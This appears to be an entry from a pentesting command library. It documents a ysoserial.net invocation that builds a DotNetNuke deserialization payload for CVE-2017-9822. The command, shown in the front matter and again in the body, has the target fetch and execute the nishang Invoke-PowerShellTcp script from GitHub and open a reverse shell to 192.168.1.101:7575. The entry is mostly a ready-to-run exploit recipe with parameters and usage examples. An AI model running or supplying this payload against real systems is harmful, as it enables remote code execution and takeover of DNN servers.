---
id: cmd-004
data: >-
  PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m
  run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex
  (New-Object
  Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
  -Reverse -IPAddress 192.168.1.101 -Port 7575"
tags:
  - deserialization
  - rce
  - powershell
type: command
output: Base64-encoded XML payload for DNNPersonalization cookie
executor: powershell
platforms:
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.702Z'
verified: false
validated: true
submitted: true
---
# ysoserial-dotnetnuke-run-command

## Command

```powershell
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575"
```

## Description

Generates a deserialization payload for DNN to execute a specified PowerShell command for reverse shell via CVE-2017-9822.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | Plugin: DotNetNuke | Yes |
| `-m` | Mode: run_command | Yes |
| `-c` | Command string, e.g., PowerShell reverse shell invocation | Yes |

## Examples

### Basic Usage

```powershell
ysoserial.exe -p DotNetNuke -m run_command -c "whoami"
```

### Advanced Usage

Full reverse shell as above.

## Expected Output

Base64-encoded XML payload for DNNPersonalization cookie.

## Related

- [[commands/ysoserial-dotnetnuke-help]]
- [[procedures/Generate-DNN-RCE-Payload-for-Reverse-Shell]]
